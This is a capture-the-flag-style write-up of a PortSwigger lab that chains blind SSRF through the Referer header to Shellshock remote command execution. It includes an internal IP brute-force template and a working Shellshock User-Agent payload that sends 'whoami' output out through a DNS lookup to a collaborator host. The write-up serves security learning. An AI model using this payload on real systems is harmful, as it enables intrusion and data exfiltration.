---
slug: "ps-ssrf-06"
title: "Blind SSRF with Shellshock exploitation"
platform: "PortSwigger"
difficulty: "Medium"
category: ["Web","SSRF"]
date: "2026-01-02"
minutes: 4
visible: true
tldr: "blind Server-Side Request Forgery (SSRF) — solved and documented end to end."
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SSRF SERIES &middot; LAB 06 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/02-Server%20Side%20Request%20Forgery(SSRF)/06-Blind%20SSRF%20with%20Shellshock%20exploitation.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<p>Exploit a <strong>blind Server-Side Request Forgery (SSRF)</strong> vulnerability to discover an <strong>internal backend system</strong>, then achieve <strong>remote command execution (RCE)</strong> by abusing a <strong>Shellshock-vulnerable service</strong>, confirmed via <strong>out-of-band (OAST) interactions</strong>.</p>
<h2>1. Initial Testing &amp; Vulnerability Identification</h2>
<h2>Feature Tested</h2>
<ul><li>Product page (<strong>HTTP GET</strong> request)</li></ul>
<p>Multiple HTTP headers were reviewed to identify backend-processed input.</p>
<h2>Parameter Identified</h2>
<ul><li><strong><code>Referer</code> header</strong></li></ul>
<h2>2. Detecting Blind SSRF via Out-of-Band Interaction</h2>
<h2>Test Performed</h2>
<p>The <code>Referer</code> header was replaced with a <strong>Burp Collaborator</strong> URL.</p>
<h2>Observation</h2>
<ul><li><strong>DNS lookup and HTTP request</strong> observed in Burp Collaborator</li><li><strong>No visible change</strong> in the web application response</li></ul>
<h2>Conclusion</h2>
<ul><li>The backend server makes outbound requests using the <code>Referer</code></li><li>The vulnerability is <strong>blind SSRF</strong>, detectable only via <strong>OAST techniques</strong></li></ul>
<h2>3. Why This Is Blind SSRF</h2>
<ul><li>No reflected output</li><li>No error messages</li><li>No behavioral change in the response</li></ul>
<p>The only confirmation channel is <strong>external interaction</strong>, making this a classic <strong>blind SSRF</strong> case.</p>
<h2>4. Internal IP Discovery via Blind SSRF</h2>
<h2>Technique Used</h2>
<p>The <code>Referer</code> header was modified to point to an internal address:</p>
<pre class="code" data-lang="text"><code>http://192.168.0.X:8080</code></pre>
<h2>Automation</h2>
<ul><li><strong>Burp Intruder</strong> was used to brute-force the internal range</li><li>Payload position: <code>192.168.0.X</code></li><li>Range tested: <code>1 → 255</code></li></ul>
<h2>Result</h2>
<ul><li>OAST interactions were observed for a specific internal IP</li><li>This confirmed a <strong>reachable internal backend service</strong></li></ul>
<h2>5. Identifying the Shellshock Injection Point</h2>
<p>Analysis of the Collaborator interaction revealed:</p>
<ul><li>The <strong><code>User-Agent</code> header</strong> was included in outbound requests</li><li>This indicates backend processing by a shell-based component</li></ul>
<p>This made <code>User-Agent</code> a viable vector for <strong>Shellshock exploitation</strong>.</p>
<h2>6. Shellshock Payload Injection</h2>
<h2>Payload Used</h2>
<pre class="code" data-lang="bash"><code>() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
</code></pre>
<h2>Injection Point</h2>
<ul><li><strong><code>User-Agent</code> HTTP header</strong></li></ul>
<h2>7. Command Execution Confirmation</h2>
<h2>Observation in Burp Collaborator</h2>
<p>A DNS lookup was received containing the output of the <code>whoami</code> command:</p>
<pre class="code" data-lang="text"><code>peter-a8Cwe4</code></pre>
<h2>What This Proves</h2>
<ul><li>Arbitrary OS commands are executed on the backend</li><li>The backend system is <strong>vulnerable to Shellshock</strong></li><li>The command runs under the user context <strong><code>peter-a8Cwe4</code></strong></li></ul>
<p>This confirms <strong>true remote command execution</strong>, not just SSRF interaction.</p>
<h2>8. Final Result</h2>
<pre class="code" data-lang="text"><code>Vulnerability chain:
BlindSSRF
→InternalIPbrute-force
→Headerinjection
→Shellshock
→Remotecommandexecution

Execution context:
peter-a8Cwe4
</code></pre>
<p>The lab was marked as <strong>solved</strong> after successful command execution.</p>
<h2>9. Key Takeaways (Attacker Mindset)</h2>
<ul><li>Blind SSRF often requires <strong>enumeration before exploitation</strong></li><li>Internal services may exist even when no response is visible</li><li>Headers forwarded by backend services are high-value targets</li><li>SSRF can act as a <strong>discovery and delivery vector</strong> for RCE</li><li>OAST tooling is essential when applications provide zero feedback</li></ul>
<h2>10. Notes for My Future Self</h2>
<ul><li>Always brute-force internal IP ranges in blind SSRF</li><li>Monitor which headers are forwarded downstream</li><li>Shellshock is still exploitable in legacy environments</li><li>DNS-based payloads are reliable for blind RCE verification</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SSRF SERIES :: LAB 06 COMPLETE</code></details>
